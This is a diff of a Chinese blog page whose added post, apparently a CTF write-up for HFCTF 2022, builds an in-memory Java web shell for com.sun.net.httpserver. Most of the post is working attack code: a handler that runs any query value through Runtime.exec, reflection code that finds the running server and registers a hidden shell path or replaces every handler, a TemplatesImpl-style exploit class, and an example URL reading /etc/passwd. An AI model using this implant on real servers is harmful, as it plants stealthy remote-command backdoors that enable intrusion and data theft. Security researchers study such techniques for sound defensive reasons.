@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">rss | popko&#39;s Blog</title>
+  <title itemprop="name">popko&#39;s Blog</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -164,12 +164,349 @@
   </div>
 </header>
 
-        <div class="pattern-center-blank"></div>
-  
-  <div id="content" class="site-content">
-    <article class="post-item post-301 page type-page status-publish has-post-thumbnail hentry">
-      
-      <!-- .entry-content -->
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+          <header class="entry-header">
+            <h1 class="entry-title"></h1>
+            <p class="entry-census">&nbsp;·&nbsp;2022-4-2&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
+
+            <hr>
+          </header>
+        
+        <div class="entry-content">
+          <h1 id="HttpHandler内存马"><a href="#HttpHandler内存马" class="headerlink" title="HttpHandler内存马"></a>HttpHandler内存马</h1><h2 id="handlerDemo"><a href="#handlerDemo" class="headerlink" title="handlerDemo"></a>handlerDemo</h2><pre><code class="java">package com.ctf.ezchain;
+
+import com.caucho.hessian.io.Hessian2Input;
+import com.sun.net.httpserver.HttpExchange;
+import com.sun.net.httpserver.HttpHandler;
+import com.sun.net.httpserver.HttpServer;
+import templates.ShellHandler;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.Member;
+import java.net.InetSocketAddress;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.Objects;
+import java.util.concurrent.Executors;
+
+public class Index1 &#123;
+    public Index1() &#123;
+    &#125;
+
+    public static void main(String[] args) throws Exception &#123;
+        System.out.println(&quot;server start&quot;);
+        HttpServer server = HttpServer.create(new InetSocketAddress(8091), 0);
+        server.createContext(&quot;/&quot;, new Index1.MyHandler());
+//        server.createContext(&quot;/ShellHandler&quot;, new ShellHandler());
+        server.setExecutor(Executors.newCachedThreadPool());
+        server.start();
+    &#125;
+
+        public void handle(HttpExchange t) throws IOException &#123;
+            String query = t.getRequestURI().getQuery();
+            Map&lt;String, String&gt; queryMap = this.queryToMap(query);
+            String response = &quot;Welcome to HFCTF 2022&quot;;
+            if (queryMap != null) &#123;
+                String token = (String) queryMap.get(&quot;token&quot;);
+                String secret = &quot;HFCTF2022&quot;;
+                if (Objects.hashCode(token) == secret.hashCode() &amp;&amp; !secret.equals(token)) &#123;
+//                if (true) &#123;
+                    InputStream is = t.getRequestBody();
+
+                    try &#123;
+                        Hessian2Input input = new Hessian2Input(is);
+                        input.readObject();
+                    &#125; catch (Exception var9) &#123;
+                        response = &quot;oops! something is wrong&quot;;
+                    &#125;
+                &#125; else &#123;
+                    response = &quot;your token is wrong&quot;;
+                &#125;
+            &#125;
+
+            t.sendResponseHeaders(200, (long) response.length());
+            OutputStream os = t.getResponseBody();
+            os.write(response.getBytes());
+            os.close();
+        &#125;
+
+        public Map&lt;String, String&gt; queryToMap(String query) &#123;
+            if (query == null) &#123;
+                return null;
+            &#125; else &#123;
+                Map&lt;String, String&gt; result = new HashMap();
+                String[] var3 = query.split(&quot;&amp;&quot;);
+                int var4 = var3.length;
+
+                for (int var5 = 0; var5 &lt; var4; ++var5) &#123;
+                    String param = var3[var5];
+                    String[] entry = param.split(&quot;=&quot;);
+                    if (entry.length &gt; 1) &#123;
+                        result.put(entry[0], entry[1]);
+                    &#125; else &#123;
+                        result.put(entry[0], &quot;&quot;);
+                    &#125;
+                &#125;
+
+                return result;
+            &#125;
+        &#125;
+    &#125;
+&#125;
+
+</code></pre>
+<h2 id="handler马"><a href="#handler马" class="headerlink" title="handler马"></a>handler马</h2><pre><code class="java">package templates;
+
+import com.sun.net.httpserver.HttpExchange;
+import com.sun.net.httpserver.HttpHandler;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+
+public class ShellHandler implements HttpHandler &#123;
+    public void handle(HttpExchange t) throws IOException &#123;
+        String query = t.getRequestURI().getQuery();
+        String res = &quot;hello world&quot;;
+        if (query != null &amp;&amp; query.indexOf(&quot;=&quot;) != -1) &#123;
+            String[] flag = query.split(&quot;=&quot;);
+            if (flag[0].equals(&quot;popko&quot;)) &#123;
+                String line = null;
+                BufferedReader reader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(flag[1]).getInputStream(), &quot;gbk&quot;));
+                while ((line = reader.readLine()) != null) &#123;
+//                    System.out.println(line);
+                    res += line;
+                &#125;
+            &#125;
+        &#125;
+        t.sendResponseHeaders(200, res.length());
+        OutputStream os = t.getResponseBody();
+        os.write(res.getBytes());
+        os.close();
+    &#125;
+&#125;
+</code></pre>
+<h2 id="替换handler"><a href="#替换handler" class="headerlink" title="替换handler"></a>替换handler</h2><pre><code>Thread.currentThread().getThreadGroup()
+</code></pre><pre><code class="java">//        System.out.println(new ShellHandler() instanceof ShellHandler);
+//        System.out.println(ShellHandler.class.isInstance(new ShellHandler()));
+        System.out.println(Class.forName(&quot;templates.ShellHandler&quot;).isInstance(new ShellHandler()));
+</code></pre>
+<ul>
+<li>寻找target不为空</li>
+<li>this$0-&gt;contexts-&gt;list[0]-&gt;handler</li>
+<li>替换所有handler</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20220402152243605.png" alt="image-20220402152243605"></p>
+<p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20220402152649618.png" alt="image-20220402152649618"></p>
+<pre><code>getFV(getFV(getFV(var1, &quot;this$0&quot;), &quot;contexts&quot;),&quot;list&quot;)
+//LinkedList遍历
+</code></pre><pre><code>int size = list.size();  
+for (int i=0; i&lt;size; i++) &#123;  
+    list.get(i);          
+&#125;
+</code></pre><blockquote>
+<p>加号转为空格</p>
+<p>t.getRequestURI().getQuery().replace(“+”,” “);</p>
+<p><a target="_blank" rel="noopener" href="http://localhost:8090/?fuckkk=cat+/etc/passwd">http://localhost:8090/?fuckkk=cat+/etc/passwd</a></p>
+</blockquote>
+<h2 id="添加handler"><a href="#添加handler" class="headerlink" title="添加handler"></a>添加handler</h2><pre><code class="java">    public static void main(String[] args) throws Exception &#123;
+        System.out.println(&quot;server start&quot;);
+        HttpServer server = HttpServer.create(new InetSocketAddress(8091), 0);
+        server.createContext(&quot;/&quot;, new Index1.MyHandler());//断点
+//        server.createContext(&quot;/ShellHandler&quot;, new ShellHandler());
+        server.setExecutor(Executors.newCachedThreadPool());
+        server.start();
+    &#125;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20220402184239176.png" alt="image-20220402184239176"></p>
+<blockquote>
+<p>获取server就可以添加handler了</p>
+</blockquote>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="java">package marshalsec.templates;
+
+import com.sun.net.httpserver.HttpExchange;
+import com.sun.net.httpserver.HttpHandler;
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.lang.reflect.Field;
+import java.util.LinkedList;
+
+public class ShellHandler extends AbstractTranslet implements HttpHandler &#123;
+    static &#123;
+        System.out.println(&quot;[]start&quot;);
+        try &#123;
+//            replaceHandlers();
+            addHandler();
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+        System.out.println(&quot;[]end&quot;);
+    &#125;
+
+    public static Object getFV(Object var0, String var1) throws Exception &#123;
+        Field var2 = null;
+        Class var3 = var0.getClass();
+        while (var3 != Object.class) &#123;
+            try &#123;
+                var2 = var3.getDeclaredField(var1);
+                break;
+            &#125; catch (NoSuchFieldException var5) &#123;
+                var3 = var3.getSuperclass();
+            &#125;
+        &#125;
+        if (var2 == null) &#123;
+            throw new NoSuchFieldException(var1);
+        &#125; else &#123;
+            var2.setAccessible(true);
+            return var2.get(var0);
+        &#125;
+    &#125;
+
+    public static LinkedList getContextList() throws Exception &#123;
+        try &#123;
+            Thread[] var5 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);
+            for (int var6 = 0; var6 &lt; var5.length; ++var6) &#123;
+                Thread var7 = var5[var6];
+                if (var7 != null) &#123;
+                    Object var1 = getFV(var7, &quot;target&quot;);
+                    if (var1 != null) &#123;
+//                            Object var1 = getFV(var7, &quot;target&quot;);
+//                            if (Class.forName(&quot;sun.net.httpserver.ServerImpl$Dispatcher&quot;).isInstance(Thread.currentThread().getThreadGroup().threads[1].target)) &#123;
+                        if (Class.forName(&quot;sun.net.httpserver.ServerImpl$Dispatcher&quot;).isInstance(var1)) &#123;
+                            LinkedList var2 = (LinkedList) getFV(getFV(getFV(var1, &quot;this$0&quot;), &quot;contexts&quot;), &quot;list&quot;);
+                            return var2;
+                        &#125;
+                    &#125;
+                &#125;
+            &#125;
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+        return null;
+    &#125;
+
+    public static void addHandler() throws Exception &#123;
+        LinkedList var2 = getContextList();
+        if (var2 != null) &#123;
+            Object var3 = getFV(var2.get(0), &quot;server&quot;);
+            java.lang.reflect.Method method = var3.getClass().getDeclaredMethod(&quot;createContext&quot;, String.class, HttpHandler.class);
+            method.setAccessible(true);
+            String mapper = &quot;/favicon11.jpg&quot;;
+            method.invoke(var3, mapper, new ShellHandler());
+        &#125;
+    &#125;
+
+    public static void replaceHandlers() throws Exception &#123;
+        LinkedList var2 = getContextList();
+        if (var2 != null) &#123;
+            for (int i = 0; i &lt; var2.size(); i++) &#123;
+                Object var3 = var2.get(i);
+                Field field = var3.getClass().getDeclaredField(&quot;handler&quot;);
+                field.setAccessible(true);
+                field.set(var3, new ShellHandler());
+            &#125;
+        &#125;
+    &#125;
+
+    public void handle(HttpExchange t) throws IOException &#123;
+        String query = t.getRequestURI().getQuery();
+        String res = &quot;hello world&quot;;
+        if (query != null &amp;&amp; query.indexOf(&quot;=&quot;) != -1) &#123;
+            String[] flag = query.replace(&quot;+&quot;, &quot; &quot;).split(&quot;=&quot;);
+            if (flag[0].equals(&quot;fuckkk&quot;)) &#123;
+                String line = null;
+                BufferedReader reader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(flag[1]).getInputStream(), &quot;gbk&quot;));
+                while ((line = reader.readLine()) != null) &#123;
+//                    System.out.println(line);
+                    res += line;
+                &#125;
+            &#125;
+        &#125;
+        t.sendResponseHeaders(200, res.length());
+        OutputStream os = t.getResponseBody();
+        os.write(res.getBytes());
+        os.close();
+    &#125;
+
+    @Override
+    public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException &#123;
+
+    &#125;
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;
+
+    &#125;
+&#125;
+</code></pre>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="/#"></li>
+                <li class="wechat-code"><img src="/#"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2022/04/01/Hessian2/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                Hessian2反序列化</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
       
 <div id="vcomments"></div>
 <script>
@@ -185,43 +522,25 @@
   }
 </script>
 
-      <div class="single-reward">
-        <div class="reward-open">赏
-          <div class="reward-main">
-            <ul class="reward-row">
-              <li class="alipay-code"><img src="/#"></li>
-              <li class="wechat-code"><img src="/#"></li>
-            </ul>
-          </div>
-        </div>
-      </div>
-      <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
-      <footer class="post-footer">
-        <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
-        <div class="post-tags">
-        </div>
-        <div class="post-share">
-          <div class="social-share sharehidden share-component"></div>
-          <i class="iconfont show-share icon-forward"></i>
-        </div>
-      </footer><!-- .entry-footer -->
-    </article>
-      <!-- #post-## -->
       <section class="author-profile">
         <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
-          <a href="/about/" class="profile gravatar"><img src="/img/custom/avatar.jpg" itemprop="image" alt="popko" height="70" width="70"></a>
+          <a href="" class="profile gravatar"><img src="" itemprop="image" alt="" height="70" width="70"></a>
           <div class="meta">
             <span class="title">Author</span>
             <h3 itemprop="name">
-            <a href="https://pipimi110.github.io" itemprop="url" rel="author">popko</a>
+            <a href="" itemprop="url" rel="author"></a>
             </h3>
           </div>
         </div>
         <hr>
-        <p><i class="iconfont icon-write"></i>不是二刺螈，只是个喜欢acg和偶尔挖挖洞的阿宅</p>
+        <p><i class="iconfont icon-write"></i></p>
       </section>
+    </main><!-- #main -->
   </div><!-- #primary -->
 </div>
+
+
+
     </div>    
     <div class="ins-search">
     <div class="ins-search-mask"></div>
